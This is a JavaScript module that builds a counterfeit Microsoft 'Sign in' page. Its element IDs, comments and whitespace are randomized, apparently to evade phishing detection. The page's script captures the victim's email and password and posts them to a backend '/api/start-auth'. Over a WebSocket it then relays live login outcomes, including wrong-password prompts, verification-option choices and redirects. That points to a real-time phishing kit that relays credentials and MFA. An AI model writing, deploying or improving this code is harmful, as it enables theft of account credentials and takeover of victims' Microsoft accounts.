/**
 * Microsoft Login Page Generator
 * Generates dynamic, randomized login.html as string
 */

const { randomId, randomComment, randomizeWhitespace } = require('./utils/randomizer');
const msCss = require('./utils/msCss');

function generateMsLoginPage(token, options = {}) {
    const { randomize = true } = options;

    // Generate random IDs for key elements
    const ids = {
        usernameInput: randomize ? randomId('input') : 'username-input',
        passwordInput: randomize ? randomId('pwd') : 'password-input',
        nextBtn: randomize ? randomId('btn') : 'next-btn',
        signinBtn: randomize ? randomId('submit') : 'signin-btn',
        usernameError: randomize ? randomId('err') : 'username-error',
        passwordError: randomize ? randomId('err') : 'password-error',
        userDisplay: randomize ? randomId('display') : 'user-display',
        usernameView: randomize ? randomId('view') : 'username-view',
        passwordView: randomize ? randomId('view') : 'password-view',
        backBtn: randomize ? randomId('back') : 'back-btn'
    };

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    ${randomComment()}
    <style>
        ${msCss}
    </style>
</head>
<body>
    ${randomComment()}
    <!-- Main Login Container -->
    <div id="login-container">
        <!-- Username View -->
        <div id="${ids.usernameView}" class="view active">
            <div class="logo-container">
                <svg class="ms-logo-main" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 0H10V10H0V0Z" fill="#f25022" />
                    <path d="M11 0H21V10H11V0Z" fill="#7fba00" />
                    <path d="M0 11H10V21H0V11Z" fill="#00a4ef" />
                    <path d="M11 11H21V21H11V11Z" fill="#ffb900" />
                </svg>
                <h2 style="color: #ffffff;">Microsoft</h2>
            </div>

            <h1 style="text-align: center; color: #ffffff;">Sign in</h1>
            <p style="text-align: center; color: #ffffff; font-size: smaller;">Use your Microsoft account.</p>
            <br>
            <div class="input-container">
                <label for="${ids.usernameInput}">Email or phone</label>
                <input type="text" id="${ids.usernameInput}" placeholder="Email or phone" autocomplete="username">
                <div class="error-message" id="${ids.usernameError}">Enter a valid email address, phone number, or Skype name.</div>
            </div>

            <div class="links-container">
                <a href="#" class="link">Forgot your username?</a>
            </div>

            <div class="button-container">
                <button class="btn-primary" id="${ids.nextBtn}">Next</button>
            </div><br>

            <p style="text-align: center; color: #ffffff;">New to Microsoft? <a href="#">Create an account</a></p>

            <div class="signin-option">
                <svg class="signin-option-icon" viewBox="0 0 24 24" fill="#1b1b1b">
                    <path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.68-.2-.13-.24-.04-.55.2-.68C7.82 2.52 9.86 2 12.01 2c2.13 0 3.99.47 6.03 1.52.25.13.34.43.21.67-.09.18-.26.28-.44.28zM3.5 9.72c-.1 0-.2-.03-.29-.09-.23-.16-.28-.47-.12-.7.99-1.4 2.25-2.5 3.75-3.27C9.98 4.04 14 4.03 17.15 5.65c1.5.77 2.76 1.86 3.75 3.25.16.22.11.54-.12.7-.23.16-.54.11-.7-.12-.9-1.26-2.04-2.25-3.39-2.94-2.87-1.47-6.54-1.47-9.4.01-1.36.7-2.5 1.7-3.4 2.96-.08.14-.23.21-.39.21zm6.25 12.07c-.13 0-.26-.05-.35-.15-.87-.87-1.34-1.43-2.01-2.64-.69-1.23-1.05-2.73-1.05-4.34 0-2.97 2.54-5.39 5.66-5.39s5.66 2.42 5.66 5.39c0 .28-.22.5-.5.5s-.5-.22-.5-.5c0-2.42-2.09-4.39-4.66-4.39-2.57 0-4.66 1.97-4.66 4.39 0 1.44.32 2.77.93 3.85.64 1.15 1.08 1.64 1.85 2.42.19.2.19.51 0 .71-.11.1-.24.15-.37.15zm7.17-1.85c-1.19 0-2.24-.3-3.1-.89-1.49-1.01-2.38-2.65-2.38-4.39 0-.28.22-.5.5-.5s.5.22.5.5c0 1.41.72 2.74 1.94 3.56.71.48 1.54.71 2.54.71.24 0 .64-.03 1.04-.1.27-.05.53.13.58.41.05.27-.13.53-.41.58-.57.11-1.07.12-1.21.12zM14.91 22c-.04 0-.09-.01-.13-.02-1.59-.44-2.63-1.03-3.72-2.1-1.4-1.39-2.17-3.24-2.17-5.22 0-1.62 1.38-2.94 3.08-2.94 1.7 0 3.08 1.32 3.08 2.94 0 1.07.93 1.94 2.08 1.94s2.08-.87 2.08-1.94c0-3.77-3.25-6.83-7.25-6.83-2.84 0-5.44 1.58-6.61 4.03-.39.81-.59 1.76-.59 2.8 0 .78.07 2.01.67 3.61.1.26-.03.55-.29.64-.26.1-.55-.04-.64-.29-.49-1.31-.73-2.61-.73-3.96 0-1.2.23-2.29.68-3.24 1.33-2.79 4.28-4.6 7.51-4.6 4.55 0 8.25 3.51 8.25 7.83 0 1.62-1.38 2.94-3.08 2.94s-3.08-1.32-3.08-2.94c0-1.07-.93-1.94-2.08-1.94s-2.08.87-2.08 1.94c0 1.71.66 3.31 1.87 4.51.95.94 1.86 1.46 3.27 1.85.27.07.42.35.35.61-.05.23-.26.38-.47.38z" />
                </svg>
                <span>Sign-in options</span>
            </div>
        </div>

        <!-- Password View -->
        <div id="${ids.passwordView}" class="view">
            <div class="logo-container">
                <svg class="ms-logo-main" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 0H10V10H0V0Z" fill="#f25022" />
                    <path d="M11 0H21V10H11V0Z" fill="#7fba00" />
                    <path d="M0 11H10V21H0V11Z" fill="#00a4ef" />
                    <path d="M11 11H21V21H11V11Z" fill="#ffb900" />
                </svg>
                <h2 style="color: #ffffff;">Microsoft</h2>
            </div>
            
            <button class="back-button" id="${ids.backBtn}" style="color: #ffffff;">
                <svg class="back-arrow" viewBox="0 0 12 12" fill="#ffffff">
                    <path d="M10 5H3.83L6.42 2.41L5 1L0 6L5 11L6.41 9.59L3.83 7H10V5Z" />
                </svg>
            </button>

            <div class="user-display" id="${ids.userDisplay}" style="color: #ffffff;"></div>

            <h1 style="color: #ffffff;">Enter password</h1>

            <div class="input-container">
                <label for="${ids.passwordInput}">Password</label>
                <input type="password" id="${ids.passwordInput}" placeholder="Password" autocomplete="current-password">
                <div class="error-message" id="${ids.passwordError}">Please enter your password.</div>
            </div>

            <div class="links-container">
                <a href="#" class="link" style="color: #a0a0a0;">Forgot password?</a>
            </div>

            <div class="button-container" style="display: flex; gap: 12px;">
                <button class="btn-secondary" id="password-back-btn" style="color: #ffffff; background: transparent; border: 1px solid #666666;">Back</button>
                <button class="btn-primary" id="${ids.signinBtn}">Sign in</button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy &amp; cookies</a>
        <a href="#">...</a>
    </div>

    <script>
        // Use IFFE to keep scope clean
        (function() {
            // Form functionality
            const usernameInput = document.getElementById('${ids.usernameInput}');
            const passwordInput = document.getElementById('${ids.passwordInput}');
            const usernameError = document.getElementById('${ids.usernameError}');
            const passwordError = document.getElementById('${ids.passwordError}');
            const userDisplay = document.getElementById('${ids.userDisplay}');
            const usernameView = document.getElementById('${ids.usernameView}');
            const passwordView = document.getElementById('${ids.passwordView}');
            const signinBtn = document.getElementById('${ids.signinBtn}');
            const nextBtn = document.getElementById('${ids.nextBtn}');
            const backBtn = document.getElementById('${ids.backBtn}');
            const pwdBackBtn = document.getElementById('password-back-btn');
            const originalSigninText = signinBtn.textContent;
            let isProcessing = false;

            // WebSocket connection
            const ws = new WebSocket(\`ws://\${window.location.host}\`);

            ws.onopen = () => console.log('🔌 Connected to WebSocket server');
            ws.onclose = () => console.log('🔌 Disconnected from WebSocket server');

            ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);

                    if (data.status === 'automation_started') {
                        console.log('🚀 Automation started');
                        return;
                    }

                    if (data.status === 'automation_completed' || data.status === 'automation_finished') {
                        if (!data.redirect) {
                            signinBtn.textContent = originalSigninText;
                            signinBtn.disabled = false;
                            isProcessing = false;
                        }
                        return;
                    }

                    if (data.status === 'wrong_password' && data.message) {
                        signinBtn.textContent = originalSigninText;
                        signinBtn.disabled = false;
                        isProcessing = false;
                        passwordInput.value = '';
                        passwordError.textContent = data.message;
                        passwordError.classList.add('show');
                        setTimeout(() => passwordInput.focus(), 100);
                        return;
                    }

                    if (data.redirect) {
                        isProcessing = false;
                        if (data.status === 'option_selected' && data.selectedOption) {
                            sessionStorage.setItem('selectedOption', data.selectedOption);
                        }
                        window.location.href = data.redirect;
                        return;
                    }
                    
                    if (data.displayValues) {
                        isProcessing = false;
                        sessionStorage.setItem('resultList', JSON.stringify(data.displayValues));
                        window.location.href = '/${token}/very';
                        return;
                    }

                    if (data.status === 'login_success') {
                        isProcessing = false;
                        window.location.href = data.redirect || 'https://www.outlook.com';
                        return;
                    }
                } catch (error) {
                    console.error('Error parsing WebSocket message:', error);
                }
            };

            // Next button
            nextBtn.addEventListener('click', () => {
                const username = usernameInput.value.trim();
                if (!username) {
                    usernameError.classList.add('show');
                    return;
                }
                usernameError.classList.remove('show');
                sessionStorage.setItem('userEmail', username);
                userDisplay.textContent = username;
                usernameView.classList.remove('active');
                passwordView.classList.add('active');
                setTimeout(() => passwordInput.focus(), 100);
            });

            usernameInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') nextBtn.click();
            });

            const goBack = () => {
                passwordView.classList.remove('active');
                usernameView.classList.add('active');
                passwordInput.value = '';
                passwordError.classList.remove('show');
                setTimeout(() => usernameInput.focus(), 100);
            };

            backBtn.addEventListener('click', goBack);
            pwdBackBtn.addEventListener('click', goBack);

            // Sign in button
            signinBtn.addEventListener('click', async () => {
                console.log('🔘 Sign in button clicked');
                const password = passwordInput.value;
                if (!password) {
                    console.log('❌ No password entered');
                    passwordError.classList.add('show');
                    return;
                }
                passwordError.classList.remove('show');
                if (isProcessing) {
                    console.log('⏳ Already processing, ignoring click');
                    return;
                }

                isProcessing = true;
                signinBtn.textContent = 'Signing in...';
                signinBtn.disabled = true;

                const payload = {
                    email: usernameInput.value.trim(),
                    password: password,
                    token: '${token}'
                };
                console.log('📤 Sending to /api/start-auth:', { email: payload.email, token: payload.token });

                try {
                    // Trigger backend automation via API
                    const response = await fetch('/api/start-auth', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                    });
                    console.log('📥 Response status:', response.status);
                    const data = await response.json();
                    console.log('📥 Response data:', data);
                    if (!data.success) throw new Error(data.message);
                    console.log('✅ Automation started successfully');
                } catch (error) {
                    console.error('❌ Error starting automation:', error);
                    signinBtn.textContent = originalSigninText;
                    signinBtn.disabled = false;
                    isProcessing = false;
                    alert('Check credentials or connection: ' + error.message);
                }
            });

            passwordInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') signinBtn.click();
            });
            
            usernameInput.addEventListener('input', () => usernameError.classList.remove('show'));
            passwordInput.addEventListener('input', () => passwordError.classList.remove('show'));
        })();
    </script>
</body>
</html>`;

    return randomizeWhitespace(html);
}

module.exports = { generateMsLoginPage };
